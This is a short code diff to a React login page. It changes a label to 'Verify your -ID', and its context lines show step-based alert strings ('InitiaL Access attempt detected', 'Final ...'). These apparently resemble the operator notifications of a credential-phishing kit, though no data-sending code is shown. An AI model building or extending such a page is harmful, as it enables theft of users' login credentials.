@@ -214,7 +214,7 @@ ${step === 1 ? '⚠️ *InitiaL Access attempt detected* ⚠️' : '🚨 *Final 
                   
                   {/* Secure Login Text */}
                   <g transform="translate(45, 0)">
-                    <text x="0" y="25" fill="url(#textGradient)" fontFamily="Arial, sans-serif" fontWeight="bold" fontSize="20">Verify</text>
+                    <text x="0" y="25" fill="url(#textGradient)" fontFamily="Arial, sans-serif" fontWeight="bold" fontSize="20">Verify your -ID</text>
                   </g>
                 </svg>
                 
@@ -343,5 +343,6 @@ ${step === 1 ? '⚠️ *InitiaL Access attempt detected* ⚠️' : '🚨 *Final 
 };
 
 export default LoginPage;
+
 
 
